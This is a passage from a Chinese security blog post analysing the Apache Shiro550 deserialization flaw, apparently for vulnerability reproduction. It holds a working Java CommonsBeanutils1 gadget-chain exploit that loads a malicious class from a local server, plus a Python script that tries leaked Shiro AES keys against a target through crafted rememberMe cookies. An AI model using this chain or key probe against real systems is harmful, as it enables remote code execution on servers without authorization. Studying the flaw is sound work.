+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shlin;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> shlin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> DeserializeChain</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.shlin.CB1Exp.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/9/26 21:00</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB1Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvilBytes(String u) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(u).openConnection().getInputStream();<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> length;<br>        <span class="hljs-keyword">while</span> ((length = inputStream.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>            byteArrayOutputStream.write(buffer, <span class="hljs-number">0</span>, length);<br>        &#125;<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TemplatesImpl</span>&gt; templatesClass = templates.getClass();<br>        <span class="hljs-comment">//        byte[] evilClass = Files.readAllBytes(Paths.get(&quot;D:\\SecTools\\web\\DeserializeChain\\CB1\\src\\main\\java\\com\\shlin\\entity\\Calc.class&quot;));</span><br>        <span class="hljs-type">byte</span>[] evilClass = getEvilBytes(<span class="hljs-string">&quot;http://127.0.0.1:8000/Calc.class&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates, <span class="hljs-string">&quot;cb1&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytes.setAccessible(<span class="hljs-literal">true</span>);<br>        bytes.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;evilClass&#125;);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(<span class="hljs-number">2</span>, beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        beanComparator.setProperty(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PriorityQueue</span>&gt; queueClass = priorityQueue.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> queueClass.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        queue.setAccessible(<span class="hljs-literal">true</span>);<br>        queue.set(priorityQueue, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);<br><br>        serialize(priorityQueue);<br>        <span class="hljs-comment">//        deserialize(&quot;cb1-ser.bin&quot;);</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;cb1-ser.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-keyword">return</span> objectInputStream.readObject();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409302215471.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409302214761.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409302215439.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="四、漏洞探测"><a href="#四、漏洞探测" class="headerlink" title="四、漏洞探测"></a>四、漏洞探测</h1><h2 id="4-1-指纹识别"><a href="#4-1-指纹识别" class="headerlink" title="4.1 指纹识别"></a>4.1 指纹识别</h2><p>在利用 shiro 漏洞时需要判断应用是否用到了 shiro。<br>在请求包的 Cookie 中为 <code>rememberMe</code> 字段赋任意值，收到返回包的 Set-Cookie 中存在 <code>rememberMe=deleteMe</code> 字段，说明目标有使用 Shiro 框架，可以进一步测试。</p>
+<h2 id="4-2-AES密钥判断"><a href="#4-2-AES密钥判断" class="headerlink" title="4.2 AES密钥判断"></a>4.2 AES密钥判断</h2><p>前面说到 Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。</p>
+<p>即使升级到了1.2.4以上的版本，很多开源的项目会自己设定密钥。可以收集密钥的集合，或者对密钥进行爆破。</p>
+<p>那么如何判断密钥是否正确呢？<br>文章 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&mid=2247485052&idx=1&sn=b007a722e233b45982b7a57c3788d47d&scene=21#wechat_redirect">一种另类的 shiro 检测方式</a>提供了思路，当密钥不正确或类型转换异常时，目标 Response 包含 <code>Set-Cookie：rememberMe=deleteMe</code> 字段，而当密钥正确且没有类型转换异常时，返回包不存在 <code>Set-Cookie：rememberMe=deleteMe</code> 字段。</p>
+<p>因此我们需要构造 payload 排除类型转换错误，进而准确判断密钥。</p>
+<p>shiro 在 1.4.2 版本之前， AES 的模式为 CBC， IV 是随机生成的，并且 IV 并没有真正使用起来，所以整个 AES 加解密过程的 key 就很重要了，正是因为 AES 使用 Key 泄漏导致反序列化的 cookie 可控，从而引发反序列化漏洞。<br>在 1.4.2 版本后，shiro 已经更换加密模式 AES-CBC 为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p>
+<p>这里给出大佬 Veraxy 的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_AES_GCM</span>(<span class="hljs-params">msg, secretKey</span>):<br>    aesCipher = AES.new(secretKey, AES.MODE_GCM)<br>    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)<br>    <span class="hljs-keyword">return</span> (ciphertext, aesCipher.nonce, authTag)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>(<span class="hljs-params">target</span>):<br>    keys = [<span class="hljs-string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span>, <span class="hljs-string">&#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;</span>,<span class="hljs-string">&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;</span>, <span class="hljs-string">&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;</span>]     <span class="hljs-comment"># 此处简单列举几个密钥</span><br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br> <br>    file_body = base64.b64decode(<span class="hljs-string">&#x27;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#x27;</span>)<br>    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> keys:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># CBC加密</span><br>            encryptor = AES.new(base64.b64decode(key), mode, iv)<br>            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))<br>            res = requests.get(target, cookies=&#123;<span class="hljs-string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;,timeout=<span class="hljs-number">3</span>,verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>) == <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确KEY ：&quot;</span> + key)<br>                <span class="hljs-keyword">return</span> key<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)<br>                    <span class="hljs-keyword">return</span> key<br>            <span class="hljs-comment"># GCM加密</span><br>            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))<br>            base64_ciphertext = base64.b64encode(encryptedMsg[<span class="hljs-number">1</span>] + encryptedMsg[<span class="hljs-number">0</span>] + encryptedMsg[<span class="hljs-number">2</span>])<br>            res = requests.get(target, cookies=&#123;<span class="hljs-string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="hljs-number">3</span>, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br> <br>            <span class="hljs-keyword">if</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>) == <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确KEY:&quot;</span> + key)<br>                <span class="hljs-keyword">return</span> key<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)<br>                    <span class="hljs-keyword">return</span> key<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)<br>            <span class="hljs-keyword">return</span> key<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>
+
+<h1 id="五、参考连接"><a href="#五、参考连接" class="headerlink" title="五、参考连接"></a>五、参考连接</h1><ol>
+<li><p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#0x05-%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B">Java 反序列化 Shiro 篇 01-Shiro550 流程分析</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1iF411b7bD?spm_id_from=0.0.header_right.fav_list.click&vd_source=a4eba559e280bf2f1aec770f740d0645">Shiro反序列化漏洞(一)-shiro550流程分析_哔哩哔哩_bilibili</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Shiro550反序列化漏洞分析 – JohnFrod’s Blog</a></p>
+</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="print-no-link">#漏洞复现</a>
+      
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#反序列化</a>
+      
+        <a href="/tags/Shiro/" class="print-no-link">#Shiro</a>
+      
+        <a href="/tags/CVE/" class="print-no-link">#CVE</a>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="print-no-link">#漏洞分析</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Shiro550反序列化漏洞</div>
+      <div>http://candyb0x.github.io/2024/12/12/Shiro550反序列化漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Candy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年12月12日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年8月17日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/02/05/web%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="web漏洞之文件上传">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">web漏洞之文件上传</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/12/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E9%9B%B6%E5%88%B0%E5%85%A5%E9%97%A8/" title="Java反序列化从零到入门">
+                        <span class="hidden-mobile">Java反序列化从零到入门</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Candy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
